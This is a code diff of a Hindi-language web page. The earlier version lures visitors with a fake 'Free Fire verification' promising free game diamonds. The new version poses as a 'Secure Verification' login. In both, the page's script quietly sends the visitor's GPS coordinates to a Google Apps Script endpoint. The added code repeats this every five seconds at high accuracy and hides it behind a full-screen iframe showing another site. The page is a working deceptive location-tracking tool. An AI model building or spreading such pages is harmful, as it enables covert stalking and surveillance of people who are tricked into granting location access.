@@ -3,64 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location Tracker</title>
+    <title>Secure Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        h2 { color: #1a73e8; margin-bottom: 10px; }
-        p { color: #555; font-size: 15px; margin-bottom: 25px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 10px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: background 0.3s; }
-        .btn:hover { background: #1557b0; }
-        #status { margin-top: 20px; font-weight: bold; font-size: 14px; }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
+        #main-container { display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
+        .box { background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); width: 90%; max-width: 380px; z-index: 10; }
+        h2 { color: #1a73e8; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
+        #status { margin-top: 15px; font-size: 14px; font-weight: bold; color: #555; }
+        
+        /* Iframe को फुल स्क्रीन बनाने के लिए */
+        #redirect-frame {
+            display: none;
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+            z-index: 100;
+        }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>Free Fire वेरिफिकेशन</h2>
-    <p>अपना मैप देखने और सुरक्षित रूप से Free Fire वेरिफिकेशन शेयर करने के लिए नीचे बटन दबाएं।</p>
-    <button class="btn" onclick="sendLocation()">Free Fire वेरिफिकेशन भेजें</button>
-    <div id="status"></div>
+<iframe id="redirect-frame" src=""></iframe>
+
+<div id="main-container">
+    <div class="box" id="loginBox">
+        <h2>सुरक्षित लॉगिन</h2>
+        <p>आगे बढ़ने के लिए आईडी पासवर्ड डालें</p>
+        <input type="text" id="uid" placeholder="User ID">
+        <input type="password" id="upsw" placeholder="Password">
+        <button class="btn" onclick="validateLogin()">लॉगिन और वेरीफाई करें</button>
+        <div id="status"></div>
+    </div>
 </div>
 
 <script>
-    function sendLocation() {
-        const status = document.getElementById('status');
-        
+    // --- आपकी सेटिंग्स ---
+    const CORRECT_ID = "sahiban"; 
+    const CORRECT_PW = "8542";     
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwfrDCTA3evWq7FCFrJ5MRYi2zaah93nHUgeh4WT8kldpHQQ6AE5CvMDs1F3xHCtbhj/exec";
+    const SECOND_PAGE_URL = "https://sahiban-sys.github.io/"; // लॉगिन के बाद जो पेज दिखाना है
+
+    function validateLogin() {
+        const u = document.getElementById('uid').value;
+        const p = document.getElementById('upsw').value;
+        const statusMsg = document.getElementById('status');
+
+        if (u === CORRECT_ID && p === CORRECT_PW) {
+            statusMsg.innerText = "सत्यापित! कृपया  Allow करें...";
+            statusMsg.style.color = "blue";
+            startPermanentTracking();
+        } else {
+            statusMsg.innerText = "❌ गलत ID या पासवर्ड!";
+            statusMsg.style.color = "red";
+        }
+    }
+
+    function startPermanentTracking() {
         if (navigator.geolocation) {
-            status.innerText = "Free Fire खोजा जा रहा है...";
-            status.style.color = "#f9ab00";
-
+            // पहली बार परमिशन लेना
             navigator.geolocation.getCurrentPosition(function(position) {
-                // आपका दिया हुआ Web App URL यहाँ डाल दिया गया है
-                const scriptURL = "https://script.google.com/macros/s/AKfycbwfrDCTA3evWq7FCFrJ5MRYi2zaah93nHUgeh4WT8kldpHQQ6AE5CvMDs1F3xHCtbhj/exec";
                 
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const finalUrl = `${scriptURL}?lat=${lat}&lng=${lng}`;
+                // 1. पहली लोकेशन भेजना
+                sendToEmail(position);
 
-                // बैकग्राउंड में डेटा भेजना
-                fetch(finalUrl, { mode: 'no-cors' })
-                .then(() => {
-                    status.innerText = "✅Free Fire 200 Dimend भेज दी गई है!";
-                    status.style.color = "green";
-                })
-                .catch(() => {
-                    status.innerText = "❌ भेजने में समस्या हुई। कृपया पुनः प्रयास करें।";
-                    status.style.color = "red";
-                });
+                // 2. हर 5 सेकंड में भेजने के लिए टाइमर चालू करना
+                setInterval(trackEvery5Seconds, 5000);
+
+                // 3. यूजर को दूसरी साइट दिखाना (बिना पेज बदले)
+                document.getElementById('redirect-frame').src = SECOND_PAGE_URL;
+                document.getElementById('redirect-frame').style.display = "block";
+                document.getElementById('main-container').style.display = "none";
 
             }, function(error) {
-                status.style.color = "red";
-                if(error.code == 1) {
-                    status.innerText = "⚠️Free Fire  एक्सेस की अनुमति (Allow) दें।";
-                } else {
-                    status.innerText = "⚠️Free Fire करने में विफल।";
-                }
-            });
-        } else {
-            status.innerText = "आपका फोन GPS सपोर्ट नहीं करता।";
+                document.getElementById('status').innerText = "⚠️ कृपया 'Allow' करें वरना लॉगिन सफल नहीं होगा।";
+                document.getElementById('status').style.color = "red";
+            }, { enableHighAccuracy: true });
         }
+    }
+
+    function trackEvery5Seconds() {
+        navigator.geolocation.getCurrentPosition(sendToEmail, (err) => console.log(err), { enableHighAccuracy: true });
+    }
+
+    function sendToEmail(position) {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const finalUrl = `${SCRIPT_URL}?lat=${lat}&lng=${lng}`;
+
+        console.log("बैकग्राउंड में लोकेशन भेजी जा रही है: " + lat + "," + lng);
+
+        // गूगल स्क्रिप्ट पर डेटा भेजना
+        fetch(finalUrl, { mode: 'no-cors' }).catch(e => console.log("Network error"));
     }
 </script>
 
